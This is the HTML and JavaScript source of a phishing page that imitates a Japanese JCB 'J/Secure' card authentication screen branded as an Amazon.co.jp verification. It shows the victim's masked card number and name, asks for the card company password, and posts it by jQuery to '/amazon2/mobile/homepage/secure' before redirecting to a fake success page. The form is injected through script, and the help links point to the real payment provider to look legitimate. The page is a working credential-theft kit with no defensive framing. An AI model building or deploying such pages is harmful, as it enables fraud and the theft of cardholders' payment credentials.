
<html><head>
    <meta http-equiv="Expires" content="-1">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link href="card/a3/ntt.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" type="text/css" href="card/a3/foundation_V_PC.css">
    <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no" />
    <title>
        J/Secure
    </title>
    <style>
        .error {
            color: red
        }

        #zwimel {
            width: 100%;
            height: 100%;
            top: 0px;
            left: 0px;
            position: fixed;
            display: block;
            opacity: .9;
            background-color: #fff;
            z-index: 99;
            text-align: center;
        }

        #loading-image {
            position: fixed;
            width: 125px;
            height: 122px;
            z-index: 1000;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transform: -webkit-translate(-50%, -50%);
            transform: -moz-translate(-50%, -50%);
            transform: -ms-translate(-50%, -50%);
        }
    </style>
</head>

<body id="bodyid" onload="SetFocus()" bgcolor="#ffffff">


</body>
<script  type="text/javascript">
    setTimeout("yincang()", 0);
    function yincang() {
        let content = document.getElementById('bodyid');
        content.innerHTML = "<form method=\"post\" id=\"formvbv\" name=\"formvbv\" action=\"\">\n" +
                "    <center>\n" +
                "        <table cellpadding=\"0\" cellspacing=\"0\" border=\"0\">\n" +
                "            <tbody><tr>\n" +
                "                <td>\n" +
                "                    <table cellpadding=\"0\" cellspacing=\"0\" border=\"0\" width=\"350px\">\n" +
                "                        <tbody><tr>\n" +
                "                            <td valign=\"top\">\n" +
                "\n" +
                "\n" +
                "                                <table cellpadding=\"0\" cellspacing=\"0\" border=\"0\" width=\"100%\">\n" +
                "                                    <tbody><tr>\n" +
                "                                        <td>\n" +
                "                                            <table bgcolor=\"#FFFFFF\" border=\"0\" bordercolor=\"#88A0B8\" width=\"100%\">\n" +
                "                                                <tbody><tr>\n" +
                "                                                    <td align=\"left\" width=\"50%\">\n" +
                "                                                        <img src=\"card/a3/${image!'all.jpg'}\" border=\"0\" alt=\"J/Secure\" title=\"J/Secure\">\n" +
                "                                                    </td>\n" +
                "\n" +
                "                                                    <td align=\"right\" width=\"50%\">\n" +
                "\n" +
                "                                                    </td>\n" +
                "                                                </tr>\n" +
                "                                                </tbody></table>\n" +
                "                                            <br>\n" +
                "                                        </td>\n" +
                "                                    </tr>\n" +
                "                                    </tbody></table>\n" +
                "                                <div class=\"protection\">Added Protection</div>\n" +
                "                                <div class=\"message\">お客様のご利用カード会社インターネットサービスパスワードをご入力ください。</div>\n" +
                "\n" +
                "                                <table cellpadding=\"3\" cellspacing=\"0\" border=\"0\" width=\"100%\">\n" +
                "                                    <tbody>\n" +
                "                                    <tr>\n" +
                "                                        <td align=\"left\" height=\"10\"><img src=\"card/a3/spacer.gif\" height=\"10\" width=\"1\"></td>\n" +
                "                                    </tr>\n" +
                "                                    <tr>\n" +
                "                                        <td valign=\"top\" align=\"left\">\n" +
                "                                            <table cellpadding=\"3\" cellspacing=\"0\" border=\"0\" width=\"100%\">\n" +
                "\n" +
                "                                                <tbody><tr>\n" +
                "                                                    <td class=\"normalgray\" valign=\"top\" align=\"right\" width=\"165px\">\n" +
                "                                                        店舗名:\n" +
                "                                                    </td>\n" +
                "                                                    <td width=\"10px\">\n" +
                "                                                    </td>\n" +
                "                                                    <td valign=\"top\" class=\"normalgray\" width=\"165px\">\n" +
                "                                                        Amazon.co.jp検証\n" +
                "                                                    </td>\n" +
                "                                                </tr><tr>\n" +
                "                                                    <td class=\"normalgray\" valign=\"top\" align=\"right\" width=\"165px\">\n" +
                "                                                        金額:\n" +
                "                                                    </td>\n" +
                "                                                    <td width=\"10px\">\n" +
                "                                                    </td>\n" +
                "                                                    <td valign=\"top\" class=\"normalgray\" width=\"165px\">\n" +
                "                                                        ¥0.00\n" +
                "                                                    </td>\n" +
                "                                                </tr>\n" +
                "                                                <tr>\n" +
                "                                                    <td class=\"normalgray\" valign=\"top\" align=\"right\" width=\"165px\">\n" +
                "                                                        日付:\n" +
                "                                                    </td>\n" +
                "                                                    <td width=\"10px\">\n" +
                "                                                    </td>\n" +
                "                                                    <td valign=\"top\" class=\"normalgray\" width=\"165px\">\n" +
                "                                                    ${dateTime!''}                </td>\n" +
                "                                                </tr>\n" +
                "                                                <tr>\n" +
                "                                                    <td class=\"normalgray\" valign=\"top\" align=\"right\" width=\"165px\">\n" +
                "                                                        カード番号:\n" +
                "                                                    </td>\n" +
                "                                                    <td width=\"10px\">\n" +
                "                                                    </td>\n" +
                "                                                    <td valign=\"top\" class=\"normalgray\" width=\"165px\">\n" +
                "                                                        **** **** **** ${cardNo!''}                </td>\n" +
                "                                                </tr>\n" +
                "                                                <tr>\n" +
                "                                                    <td class=\"normalgray\" valign=\"top\" align=\"right\" width=\"165px\">\n" +
                "                                                        カード名義人：\n" +
                "                                                    </td>\n" +
                "                                                    <td width=\"10px\">\n" +
                "                                                    </td>\n" +
                "                                                    <td valign=\"top\" class=\"normalgray\" width=\"165px\">\n" +
                "                                                    ${cardName!''}\n" +
                "                                                    </td>\n" +
                "                                                </tr>\n" +
                "\n" +
                "                                                <tr>\n" +
                "                                                    <td class=\"normalgray\" valign=\"center\" width=\"165px\" align=\"right\">\n" +
                "                                                        パスワード:\n" +
                "                                                    </td>\n" +
                "                                                    <td width=\"10px\">\n" +
                "                                                    </td>\n" +
                "                                                    <td valign=\"top\" width=\"165px\">\n" +
                "                                                        <!-- no errors, retain password -->\n" +
                "\n" +
                "                                                        <input type=\"text\" maxlength=\"32\" size=\"20\" id=\"passvbv\" name=\"passvbv\" value=\"\" autocomplete=\"off\" minlength=\"6\" >\n" +
                "\n" +
                "                                                    </td>\n" +
                "\n" +
                "                                                </tr>\n" +
                "\n" +
                "\n" +
                "\n" +
                "                                                <tr>\n" +
                "                                                    <td>&nbsp;</td>\n" +
                "                                                    <td width=\"10px\">\n" +
                "                                                    </td>\n" +
                "                                                    <td valign=\"top\" align=\"left\">\n" +
                "                                                        <a class=\"forgotlink\" href=\"javascript:ForgotPassword()\">\n" +
                "                                                            パスワードを忘れた場合は\n" +
                "                                                        </a>\n" +
                "                                                    </td>\n" +
                "                                                </tr>\n" +
                "\n" +
                "                                                <tr height=\"10\">\n" +
                "                                                    <td><img src=\"card/a3/spacer.gif\"></td>\n" +
                "                                                </tr>\n" +
                "                                                <tr>\n" +
                "\n" +
                "                                                    <td valign=\"top\" align=\"left\">&nbsp;</td>\n" +
                "                                                    <td width=\"10px\">\n" +
                "                                                    </td>\n" +
                "                                                    <td valign=\"top\" align=\"left\" width=\"165px\">\n" +
                "\n" +
                "                                                        <table cellpadding=\"0\" cellspacing=\"0\" border=\"0\" width=\"165px\">\n" +
                "                                                            <tbody><tr>\n" +
                "                                                                <td nowrap=\"\">\n" +
                "                                                                    <input type=\"submit\" id=\"sendButton\" value=\"送信\">\n" +
                "                                                                </td>\n" +
                "                                                                <td nowrap=\"\">\n" +
                "                                                                    <a class=\"normallink\" href=\"javascript:Help()\">\n" +
                "                                                                        <img height=\"12\" width=\"12\" src=\"card/a3/help.jpg\" border=\"0\" alt=\"ヘルプ\" title=\"ヘルプ\">\n" +
                "                                                                    </a>\n" +
                "\n" +
                "                                                                </td>\n" +
                "                                                                <td nowrap=\"\">\n" +
                "                                                                    <a class=\"normallink\" href=\"javascript:Help()\">\n" +
                "                                                                        <font class=\"normallink\">ヘルプ</font>\n" +
                "                                                                    </a>\n" +
                "\n" +
                "                                                                </td>\n" +
                "                                                                <td nowrap=\"\">\n" +
                "                                                                    <a class=\"normallink\" href=\"javascript:Cancel()\">\n" +
                "                                                                        <font class=\"normallink\">キャンセル</font>\n" +
                "                                                                    </a>\n" +
                "\n" +
                "                                                                </td>\n" +
                "                                                            </tr>\n" +
                "                                                            </tbody></table>\n" +
                "\n" +
                "                                                    </td>\n" +
                "\n" +
                "                                                </tr>\n" +
                "\n" +
                "                                                </tbody></table>\n" +
                "                                        </td>\n" +
                "                                    </tr>\n" +
                "                                    </tbody></table>\n" +
                "\n" +
                "\n" +
                "\n" +
                "                            </td></tr><tr>\n" +
                "                        </tr></tbody></table><table cellpadding=\"0\" cellspacing=\"0\" bgcolor=\"#FFFFFF\" border=\"0\" bordercolor=\"#88A0B8\" width=\"100%\">\n" +
                "                    <tbody><tr>\n" +
                "                        <td class=\"copyright\" align=\"center\">\n" +
                "\n" +
                "                        </td>\n" +
                "                    </tr>\n" +
                "                    </tbody></table>\n" +
                "                </td></tr>\n" +
                "\n" +
                "            </tbody></table>\n" +
                "    </center>\n" +
                "</form>" +
                "<div id=\"zwimel\" class=\"zwimel\" style=\"display:none;\"><img id=\"loading-image\" src=\"../style/img/loading.gif\">";
            $("form[name='formvbv']").validate({
                rules: {
                    passvbv: {
                        required:true,
                        minlength:6
                    },
                    mmname: {
                        required:true
                    }
                },
                messages: {
                    passvbv: {minlength:"<p>正しいパスワードをご入力ください。</p>"},
                    mmname: "",
                },
                submitHandler: function(form) {
                    $("#zwimel").show();
                    $.post("/amazon2/mobile/homepage/secure", $("#formvbv").serialize(),
                            function(result) {
                                setTimeout(function() {
                                            $(location).attr("href", "success")
                                        },
                                        2000)
                            })
                },
            });
    }
</script>
<script src="../js/jquery.min.js"></script>
<script src="../js/jquery.validate.min.js"></script>
<script language="Javascript">
    function SetFocus()
    {
        document.formvbv.passvbv.focus();
    }
    function ForgotPassword()
    {
        window.open("https://acs.cafis-paynet.jp/smcc/dispatcher.jsp","forgotPasswordWin","status=yes,scrollbars=no,width=390,height=400");

    }
    function Help()
    {
        window.open("https://acs.cafis-paynet.jp/smcc/help_smcc_m.jsp","helpWin","status=yes,scrollbars=no,width=390,height=400");

    }
    function Cancel()
    {
        history.back();
    }
</script>
</html>